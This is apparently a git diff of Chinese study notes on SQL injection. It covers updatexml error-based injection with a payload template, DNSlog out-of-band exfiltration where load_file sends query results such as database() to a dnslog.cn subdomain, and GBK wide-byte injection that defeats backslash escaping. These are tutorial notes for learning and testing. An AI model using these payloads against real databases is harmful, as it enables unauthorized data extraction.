@@ -686,7 +686,8 @@ insert into t_xx (username,password) values (xxx,xxx) where username = 'Dhakkan'
 - **作用：**改变文档中符合条件的节点的值
 - **语法：**`updatexml(XML_document，XPath_string，new_value)` 第一个参数：是`string`格式，为XML文档对象的名称，文中为Doc ;第二个参数：代表`路径`，Xpath格式的字符串例如//title【@lang】; 第三个参数：`string`格式，替换查找到的符合条件的数据
 - **原理：**`updatexml`使用时，当`xpath_string`格式出现错误，`mysql`则会爆出xpath语法错误（`xpath syntax`）
-- **例如：** `select * from test where ide = 1 and (updatexml(1,0x7e,3));` 由于`0x7e`是`~`，不属于xpath语法格式，因此报出xpath语法错误。
+- **例如：** `select * from test where id=1 and (updatexml(1,0x7e,3));` 由于`0x7e`是`~`，不属于xpath语法格式，因此报出xpath语法错误。
+- **payload：**`select * from test where id=1 and (updatexml(1,concat(0x7e,payload),3));`
 
 限制：
 
@@ -884,22 +885,38 @@ update users set passwd='ccc'and payload # ' where username="xxx"
    用concat函数构造dnslog的域名,用select load_file()
 
    ```mysql
-   select load_file("\\\\test.xkpb07.dnslog.cn\\aa");#xkpb07.dnslog.cn是在dnslog生成的三级域名,可以使用concat将要查询的内容放到第四级域名,如果数据库用户有文件读写权限,则可以将查询内容带到dnslog上面
-   ```
-
+   select load_file("\\\\test.xkpb07.dnslog.cn\\aa");#xkpb07.dnslog.cn是在dnslog生成的三级域名,可以使用concat将要查询的内容放到第四级域名,如果数据库用户有文件读写权限,则可以将查询内容带到dnslog.cn上面
    
-
-
+```
+   
+   
 
 
 
 ## 宽字节注入:
 
+如果后端将前端传回的特殊符号全部进行处理，在闭合符等特殊符号前添加了反斜杠\将特殊符号全部转义成了普通的符号，此时注入语句中添加的闭合符就会失效，导致注入语句被当成字符串处理。如果后端使用了GBK编码，这种情况就可以使用宽字节注入。
+
 1. 宽字节注入的前提条件?
 
    后端使用了GBK编码的时候,存在着将ascii编码转换为GBK编码的过程,可以使用宽字节注入
 
-load_file(concat(%95"%82\%82\%82\%82\%95",database(),%95".pu5dnr.dnslog.cn%82\%82\sx.txt%95")) %23
+2. 宽字节注入的原理:
+
+   ```
+   西欧字母符号,通过1个字节表示
+   东亚字符则通过至少两个字节来表示。GBK编码就是用两个字节来表示中文区字符的一个编码标准。其编码范围：8140-FEFE（高位字节从81到FE，低位字节从40到FE）。
+   ```
+
+   编码转换存在着单字符被合并的情况：
+
+   > 反斜杠\对应的16进制编码是5c  是单字节的。
+   >
+   > 在5c前再加入一个单字节字符（范围可以是81-FE之间）比如82，就成了825c
+   >
+   > 当后端使用GBK编码的时候，就会把合理的两个单字节ASCII字符解析成一个双字节的GBK编码字符。
+   >
+   > 5c对应的反斜杠被和谐掉
 
 ## LIKE注入
 
